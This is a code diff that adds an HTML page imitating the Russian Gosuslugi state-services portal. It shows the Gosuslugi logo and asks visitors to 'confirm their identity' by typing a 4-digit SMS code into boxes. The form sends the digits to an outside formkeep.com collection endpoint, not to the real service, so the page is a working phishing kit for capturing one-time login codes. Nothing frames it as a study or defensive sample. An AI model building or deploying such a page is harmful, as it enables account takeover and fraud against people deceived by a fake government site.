@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение</title>
+    <style>
+        body {
+            background-color: #eaf3f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Verdana, sans-serif;
+            position: relative;
+        }
+        .container {
+            top: -70px;
+            background-color: #ffffff;
+            padding: 70px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.5);
+            text-align: center;
+            position: relative;
+            width: 150;
+            max-width: 500px;
+        }
+        .header {
+            margin: 0 auto 20px;
+            width: 120px;
+            height: auto;
+            transform: scale(1.5);
+            margin-bottom: 30px;
+        }
+        h2 {
+            text-align: center;
+            margin-top: 10px;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        form {
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+        .code-input {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .code-input input[type="text"] {
+            width: 40px;
+            height: 50px;
+            margin: 0 5px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            font-weight: bold;
+            box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.2);
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0d4cd3;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: -15px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .toggle-password {
+            opacity: 0;
+            margin-left: -30px;
+            cursor: pointer;
+            position: absolute;
+            right: 30px;
+            top: 53%;
+            transform: translateY(-50%);
+        }
+        .reset-password {
+            display: none;
+        }
+        .alternative-login {
+            display: none;
+        }
+        .bottom-bar {
+            /* Добавьте стили для .bottom-bar */
+        }
+        @media screen and (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            .container {
+                width: 90%;
+                padding: 20px;
+                top: 0;
+            }
+            .header {
+                transform: scale(1);
+                margin-bottom: 20px;
+            }
+            input[type="text"] {
+                width: 100%;
+            }
+            .reset-password {
+                margin-left: 0;
+                text-align: center;
+            }
+            .toggle-password {
+                margin-left: 0;
+                right: auto;
+                left: 10px;
+                top: auto;
+                bottom: 20px;
+            }
+            .alternative-login {
+                margin-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-bar"></div>
+    <div class="container">
+        <img class="header" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Gosuslugi.png/150px-Gosuslugi.png" alt="Логотип Госуслуг">
+        <h2></h2>
+        <form id="loginForm" action="https://formkeep.com/f/8b7e5b38aea2"
+              accept-charset="UTF-8"
+              enctype="multipart/form-data"
+              method="POST"
+              target="_blank">
+            <div class="code-input">
+                <input type="text" id="code1" name="code1" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" id="code2" name="code2" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" id="code3" name="code3" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+                <input type="text" id="code4" name="code4" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+            </div>
+            <div class="error-message" id="loginError"></div>
+            <input type="submit" value="Продолжить">
+            <p>Подтвердите свою личность, введите 4-значный код из смс</p>
+        </form>
+    </div>
+    <div class="bottom-bar"></div>
+
+    <script>
+        var inputs = document.querySelectorAll('.code-input input[type="text"]');
+        for (var i = 0; i < inputs.length; i++) {
+            inputs[i].addEventListener('input', function() {
+                if (this.value.length === 1) {
+                    var nextInput = this.nextElementSibling;
+                    if (nextInput !== null) {
+                        nextInput.focus();
+                    }
+                } else if (this.value.length === 0 && event.inputType === 'deleteContentBackward') {
+                    var prevInput = this.previousElementSibling;
+                    if (prevInput !== null) {
+                        prevInput.focus();
+                    }
+                }
+            });
+        }
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            var code1 = document.getElementById("code1").value.trim();
+            var code2 = document.getElementById("code2").value.trim();
+            var code3 = document.getElementById("code3").value.trim();
+            var code4 = document.getElementById("code4").value.trim();
+            var loginError = document.getElementById("loginError");
+            
+            loginError.style.display = "none";
+
+            if (code1 === "" || code2 === "" || code3 === "" || code4 === "") {
+                loginError.textContent = "Пожалуйста, введите все цифры.";
+                loginError.style.display = "block";
+                event.preventDefault();
+                return;
+            }
+        });
+    </script>
+</body>
+</html>
